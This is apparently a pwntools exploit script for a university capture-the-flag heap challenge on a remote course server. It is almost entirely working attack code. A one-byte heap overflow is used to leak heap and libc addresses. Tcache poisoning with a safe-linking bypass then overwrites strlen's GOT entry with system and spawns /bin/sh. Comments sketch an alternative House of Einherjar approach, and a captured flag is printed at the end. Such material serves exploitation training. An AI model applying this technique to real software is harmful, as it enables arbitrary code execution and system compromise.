from pwn import *
import string
from sys import argv
import os
import time
import subprocess
import struct

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
#b *rename_warrior+78
#b *free
#b *read_line+57
#b *inspect_warrior+76
b *_int_free+493
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 32901)

#p=remote("127.0.0.1", 1025)
#p2=process('tmux split-window -h docker exec -ti $(docker ps -q -f "ancestor=softsec/ragnarok") /bin/sh -c \'gdb -x /gdbscript/gdbscript -p $(pgrep -n vuln)\'', shell=True)
#sleep(4)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


def create_warrior(size, name):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Enter size: ", f"{size}".encode())
    p.sendlineafter(b"Enter name: ", name)


def inspect_warrior(size, name_part):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Enter part of the name: ", name_part)
    p.sendlineafter(b"Enter size: ", f"{size}".encode())
    p.recvuntil(b"Warrior ")
    name_and_leak = p.recv(numb=size)
    print(name_and_leak)
    p.recvuntil(b" is currently at position ")
    index = int(p.recvline())
    return name_and_leak, index


def rename_warrior(name_part, new_name):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Enter part of the name: ", name_part)
    p.sendafter(b"Enter new name: ", new_name)


def delete_warrior(name_part):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Enter part of the name: ", name_part)
    # double free?
    # some strange array entry swapping


def end():
    p.sendlineafter(b"> ", b"5")



create_warrior(0x80, b"A"*0x7F)
create_warrior(0x80, b"V"*0x7F)
delete_warrior(b"V")
# one-byte overflow POC
rename_warrior(b"A"*0x7F, b"B"*0x80)
rename_warrior(b"B"*0x80, b"C"*0x81)
rename_warrior(b"C"*0x81, b"D"*0x82)

heap_leak = int(inspect_warrior(0x200, b"D"*0x82)[0][144:144+6][::-1].hex(), 16) << 12
print("heap leak: ", hex(heap_leak))








# fill tcache for size 0x110
for i in range(18):
    create_warrior(0x108, f"{chr(ord('F')+i)}".encode()*0x107)

for i in range(16):
    if i % 2 == 0:
        delete_warrior(f"{chr(ord('F')+i)}".encode())



libc_leak = int(inspect_warrior(0x200, b"S"*0x82)[0][272:272+6][::-1].hex(), 16)

print("libc leak: ", hex(libc_leak))


libc_base = libc_leak - 0x1d2cc0

# see moodle
strlen_got_addr = libc_base + 0x1d2080

# fuck House Of Einherjar, this shit ***does not work***
# I wasted more than 10 hours on this shit, thanks for nothing ...



# there has to be multiple tcache entries, so that allocating our fake tcache entry works
for i in range(3):
    create_warrior(0x80, f"{chr(ord('f')+i)}".encode()*0x7F)

for i in range(2, -1, -1):
    delete_warrior(f"{chr(ord('f')+i)}".encode())

#input("wait a second")


for i in range(0x100-0x82):
    rename_warrior(b"D"*(0x82+i), b"D"*(0x83+i))

def PROTECT_PTR(pos, ptr):
    return (((pos) >> 12) ^ (ptr))

key_leak = inspect_warrior(0x200, b"G"*0x107)[0][0x118:0x120]

rename_warrior(b"D"*0x100, (b"D"*(0x320-0x290-0x10)+p64(0)+p64(0x110)+p64(PROTECT_PTR(heap_leak, strlen_got_addr))+key_leak).ljust(0x60-1)+b"\n")


create_warrior(0x80, b":"*0x7F)
input("magic")

libc = ELF("./libc.so.6")
libc.address = libc_base

libc.symbols['system']

create_warrior(0x100, b"/bin/sh\0"+b"A"*0x80)
create_warrior(0x80, p64(libc.symbols['system'])) #this one is on the GOT!
delete_warrior(b"/bin/sh")




# intended solution
# 0x100 size allocaten 2x in a row
# 0x100 because we overwrite with 00 byte and with 0x100 we don't change the size but just the flags
# | AAAA fake chunk    prev_size pointing right after AAAA | chunk we overwrite PREV_INUSE flag on |

# free 2nd chunk
# it merges to fake chunk pos, that we can reallocate now, but also overwrite
# the fake chunk should be an unsortedbin entry, so tcache must be filled before allocating the 2 0x100 entries
# fake chunk should point on itself for fd and bk

# after merging with fake chunk, allocate into tcache by overwriting size of merged fake chunk and freeing it
# finally overwrite fake merged tcache entry again to point on libc GOT with next
# allocate twice from tcache to get GOT ptr

# make sure tcache has enough items so that fake entry can actually be allocated
















p.interactive()

#softsec{tknt2MKu51gJ9NiQ-zep-0CQkk0yol1G5gDuD7CawpW-bh4rhdixlPVL3FjuqOaz}